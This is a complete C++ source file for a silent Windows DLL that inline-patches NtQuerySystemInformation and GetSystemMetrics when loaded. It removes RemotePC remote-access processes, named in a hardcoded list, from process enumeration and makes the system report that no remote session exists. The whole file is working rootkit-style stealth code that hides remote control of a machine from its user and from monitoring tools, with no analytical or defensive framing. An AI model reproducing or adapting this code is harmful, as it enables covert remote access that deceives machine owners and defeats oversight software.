// dllmain.cpp : Defines the entry point for the DLL application.
//
// SILENT VERSION — No console, no user input needed.
// All hiding rules are auto-configured at load time.
// Hooks persist for the lifetime of the process.
//
#include "pch.h"
#include <vector>
#include <set>
#include <algorithm>
#include <psapi.h>
#include <winnt.h>
#include <winternl.h>
#include <Windows.h>
#include <string>
#include <string.h>

#define STATUS_SUCCESS  ((NTSTATUS)0x00000000L)
#define SM_REMOTESESSION 0x1000

// ─────────────────────────────────────────────────────────────────────
// GLOBAL STATE
// ─────────────────────────────────────────────────────────────────────
std::set<std::wstring> hiddenNames;
std::wstring hiddenSubstring;
bool blockRemoteSession = true;

typedef NTSTATUS(WINAPI* PNT_QUERY_SYSTEM_INFORMATION)(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
    );
typedef int (WINAPI* PGET_SYSTEM_METRICS)(int nIndex);

PNT_QUERY_SYSTEM_INFORMATION origNtQuerySysInfo = nullptr;
PGET_SYSTEM_METRICS origGetSystemMetrics = nullptr;

BYTE ntqsi_originalBytes[14];
BYTE ntqsi_jumpPatch[14];
BYTE gsm_originalBytes[14];
BYTE gsm_jumpPatch[14];
CRITICAL_SECTION hookLock;

// ─────────────────────────────────────────────────────────────────────
// HELPERS
// ─────────────────────────────────────────────────────────────────────
bool ShouldHide(const wchar_t* name, USHORT lengthInBytes) {
    if (!name || lengthInBytes == 0) return false;
    USHORT charLen = lengthInBytes / sizeof(wchar_t);
    std::wstring processName(name, charLen);

    if (hiddenNames.count(processName) > 0) return true;

    if (hiddenSubstring.length() > 0) {
        std::wstring nameLower = processName;
        std::wstring subLower = hiddenSubstring;
        std::transform(nameLower.begin(), nameLower.end(), nameLower.begin(), towlower);
        std::transform(subLower.begin(), subLower.end(), subLower.begin(), towlower);
        if (nameLower.find(subLower) != std::wstring::npos) return true;
    }
    return false;
}

bool PatchBytes(void* dst, const void* src, size_t size) {
    DWORD oldProt;
    if (!VirtualProtect(dst, size, PAGE_EXECUTE_READWRITE, &oldProt)) return false;
    memcpy(dst, src, size);
    VirtualProtect(dst, size, oldProt, &oldProt);
    FlushInstructionCache(GetCurrentProcess(), dst, size);
    return true;
}

void BuildJumpPatch(BYTE* patch, void* targetAddr) {
    patch[0] = 0xFF; patch[1] = 0x25;
    patch[2] = 0x00; patch[3] = 0x00; patch[4] = 0x00; patch[5] = 0x00;
    uintptr_t addr = (uintptr_t)targetAddr;
    memcpy(&patch[6], &addr, sizeof(addr));
}

// ─────────────────────────────────────────────────────────────────────
// HOOK 1: NtQuerySystemInformation
// ─────────────────────────────────────────────────────────────────────
NTSTATUS WINAPI hookNtQuerySysInfo(
    __in SYSTEM_INFORMATION_CLASS SystemInformationClass,
    __inout PVOID SystemInformation,
    __in ULONG SystemInformationLength,
    __out_opt PULONG ReturnLength
) {
    EnterCriticalSection(&hookLock);
    PatchBytes(origNtQuerySysInfo, ntqsi_originalBytes, 14);
    NTSTATUS status = origNtQuerySysInfo(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
    PatchBytes(origNtQuerySysInfo, ntqsi_jumpPatch, 14);
    LeaveCriticalSection(&hookLock);

    if (SystemProcessInformation == SystemInformationClass && STATUS_SUCCESS == status) {
        SYSTEM_PROCESS_INFORMATION* pCurrent = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
        while (pCurrent->NextEntryOffset != 0) {
            SYSTEM_PROCESS_INFORMATION* pNext = (SYSTEM_PROCESS_INFORMATION*)((PUCHAR)pCurrent + pCurrent->NextEntryOffset);
            if (pNext->ImageName.Buffer != nullptr && ShouldHide(pNext->ImageName.Buffer, pNext->ImageName.Length)) {
                if (pNext->NextEntryOffset == 0)
                    pCurrent->NextEntryOffset = 0;
                else
                    pCurrent->NextEntryOffset += pNext->NextEntryOffset;
            }
            else {
                pCurrent = pNext;
            }
        }
    }
    return status;
}

// ─────────────────────────────────────────────────────────────────────
// HOOK 2: GetSystemMetrics
// ─────────────────────────────────────────────────────────────────────
int WINAPI hookGetSystemMetrics(int nIndex) {
    if (nIndex == SM_REMOTESESSION && blockRemoteSession) return 0;
    EnterCriticalSection(&hookLock);
    PatchBytes(origGetSystemMetrics, gsm_originalBytes, 14);
    int result = origGetSystemMetrics(nIndex);
    PatchBytes(origGetSystemMetrics, gsm_jumpPatch, 14);
    LeaveCriticalSection(&hookLock);
    return result;
}

// ─────────────────────────────────────────────────────────────────────
// SETUP — called once when DLL is loaded
// ─────────────────────────────────────────────────────────────────────
DWORD WINAPI Setup(HMODULE hModule) {
    // Auto-configure hiding rules
    hiddenSubstring = L"RemotePC";
    hiddenNames.insert(L"RPCClipboard.exe");
    hiddenNames.insert(L"RPCCMDHost.exe");
    hiddenNames.insert(L"RPCCmdViewer.exe");
    hiddenNames.insert(L"RPCCoreViewer.exe");
    hiddenNames.insert(L"RPCCoreViewerL.exe");
    hiddenNames.insert(L"RPCDownloader.exe");
    hiddenNames.insert(L"RPCFTHost.exe");
    hiddenNames.insert(L"RPCFTViewer.exe");
    hiddenNames.insert(L"RPCCodecEngine.exe");
    hiddenNames.insert(L"RPCFireWallRule.exe");
    hiddenNames.insert(L"RPCUtilityHost.exe");
    hiddenNames.insert(L"RPCSMSService.exe");
    hiddenNames.insert(L"RPCSMSDesktop.exe");
    hiddenNames.insert(L"ServiceMonitor.exe");
    hiddenNames.insert(L"ViewerService.exe");

    // Install hooks
    InitializeCriticalSection(&hookLock);

    origNtQuerySysInfo = (PNT_QUERY_SYSTEM_INFORMATION)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (origNtQuerySysInfo) {
        memcpy(ntqsi_originalBytes, origNtQuerySysInfo, 14);
        BuildJumpPatch(ntqsi_jumpPatch, hookNtQuerySysInfo);
        PatchBytes(origNtQuerySysInfo, ntqsi_jumpPatch, 14);
    }

    origGetSystemMetrics = (PGET_SYSTEM_METRICS)GetProcAddress(
        GetModuleHandleA("user32.dll"), "GetSystemMetrics");
    if (origGetSystemMetrics) {
        memcpy(gsm_originalBytes, origGetSystemMetrics, 14);
        BuildJumpPatch(gsm_jumpPatch, hookGetSystemMetrics);
        PatchBytes(origGetSystemMetrics, gsm_jumpPatch, 14);
    }

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        // Install hooks SYNCHRONOUSLY — active before LoadLibrary even returns.
        // No thread = no race window.
        Setup(hModule);
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
